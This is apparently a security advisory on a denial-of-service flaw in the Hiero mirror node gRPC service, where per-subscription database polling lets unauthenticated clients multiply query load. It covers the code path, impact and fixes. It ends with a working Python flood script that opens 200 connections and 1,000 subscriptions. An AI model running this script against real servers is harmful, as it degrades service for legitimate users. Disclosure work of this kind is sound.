### Title
Unbounded Per-Subscription Database Polling in `PollingTopicListener` Enables Unauthenticated DoS via Query Multiplication

### Summary
`PollingTopicListener.listen()` allocates a fresh `PollingContext` and an independent polling loop for every subscription, causing `topicMessageRepository.findByFilter()` to be called once per active subscription per interval. Because the gRPC endpoint requires no authentication and imposes no per-IP connection limit, an unprivileged attacker can open arbitrarily many connections and subscriptions, multiplying database query load linearly with subscription count and degrading fee-update delivery for all legitimate subscribers.

### Finding Description
**Exact code path:**

In `grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java`, `listen()` (lines 34–49):

```java
public Flux<TopicMessage> listen(TopicMessageFilter filter) {
    PollingContext context = new PollingContext(filter);   // line 35 – new context per subscription
    Duration interval = listenerProperties.getInterval(); // default 500 ms

    return Flux.defer(() -> poll(context))
            .delaySubscription(interval, scheduler)
            .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)  // repeats forever
                    .withFixedDelay(interval) ...);
}
```

`poll()` (lines 51–62) unconditionally calls:

```java
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

`findByFilter()` in `TopicMessageRepositoryCustomImpl` (lines 33–61) executes a full JPA criteria query against the database on every invocation.

**Root cause:** There is no shared/multiplexed polling path for the `POLL` listener type. Unlike `SharedPollingTopicListener` (which uses a single `Flux.share()` for all subscribers), every call to `listen()` creates its own independent timer loop. N active subscriptions → N independent DB queries every 500 ms.

**Why existing checks fail:**

- `maxConcurrentCallsPerConnection = 5` (`NettyProperties`, line 14; `GrpcConfiguration`, line 33) limits concurrent streaming calls *per TCP connection*, but places no cap on the number of TCP connections from a single IP or globally.
- There is no IP-based rate limiter, no authentication, and no global subscription quota on the gRPC path. The throttle infrastructure (`ThrottleConfiguration`, `ThrottleManagerImpl`) is scoped exclusively to the web3 module.
- The `subscriberCount` gauge (line 48–55 of `TopicMessageServiceImpl`) is a metric only; it enforces nothing.

### Impact Explanation
With the `POLL` listener type active, an attacker controlling C connections (each carrying 5 concurrent streaming calls) generates `C × 5` independent database queries every 500 ms against the `topic_message` table. At modest scale (e.g., 200 connections = 1,000 subscriptions), this produces 2,000 queries/second, saturating the database connection pool (monitored via `GrpcHighDBConnections` alert at 75% utilization) and starving legitimate subscribers of timely fee-schedule updates. The `boundedElastic` scheduler provides no back-pressure against new subscription creation.

### Likelihood Explanation
The gRPC port (5600) is publicly exposed with no authentication. Opening many TCP connections and issuing `subscribeTopic` streaming RPCs requires only a standard gRPC client and knowledge of the protobuf schema (publicly documented). The attack is trivially scriptable, repeatable, and requires zero privileges. The only soft barrier is the `maxConcurrentCallsPerConnection = 5` default, which an attacker trivially bypasses by opening more connections.

### Recommendation
1. **Share the polling Flux across identical filters** (as `SharedPollingTopicListener` already does with `.share()`): deduplicate subscriptions with the same `topicId`/`startTime` so a single DB query serves all matching subscribers.
2. **Enforce a global or per-IP subscription limit** in `TopicMessageServiceImpl.subscribeTopic()` by checking `subscriberCount` against a configurable ceiling and rejecting excess subscriptions with `Status.RESOURCE_EXHAUSTED`.
3. **Add per-IP connection rate limiting** at the Netty/gRPC layer (e.g., via `maxConnectionsPerIp` or an ingress-level rate limiter).
4. **Increase the default interval** or make it adaptive under load to reduce per-subscription query frequency.

### Proof of Concept
```python
import grpc, threading
# proto stubs from hedera-protobufs
from proto import consensus_service_pb2_grpc, mirror_consensus_service_pb2 as cs

TARGET = "mirror-node-grpc:5600"
TOPIC  = cs.ConsensusTopicQuery(topicID=..., consensusStartTime=...)

def flood():
    ch = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(ch)
    # 5 concurrent streaming calls per connection (maxConcurrentCallsPerConnection default)
    streams = [stub.subscribeTopic(TOPIC) for _ in range(5)]
    for s in streams:
        threading.Thread(target=lambda st=s: list(st), daemon=True).start()

# Open 200 connections → 1,000 independent DB queries every 500 ms
for _ in range(200):
    threading.Thread(target=flood, daemon=True).start()

input("Attack running. Observe DB connection saturation via hikaricp_connections_active metric.")
```

Each of the 1,000 subscriptions independently executes `topicMessageRepository.findByFilter()` every 500 ms, multiplying database load by 1,000× compared to a single subscriber.